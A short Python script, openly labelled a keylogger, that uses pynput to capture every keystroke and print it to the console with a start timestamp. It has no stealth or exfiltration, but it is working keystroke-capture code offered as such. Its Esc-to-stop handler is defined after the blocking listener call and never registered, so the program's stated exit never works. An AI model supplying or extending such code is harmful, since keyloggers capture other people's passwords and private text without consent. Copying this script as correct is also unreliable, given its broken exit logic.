#Keylogger/ ScecretKeys
#This program allows you to log keystrokes.
from pynput import keyboard
from datetime import datetime

print ('Keylogger Started: ' + str(datetime.now()))

#defines on_press function so that whenever a key is pressed its extracted, the listener is used as a callback device
def on_press(key):
    try:
        print('{0}'.format(key.char))
    except AttributeError:
        print('\n Special key {0} pressed'.format(key))
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

#Ends keylogger program
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False
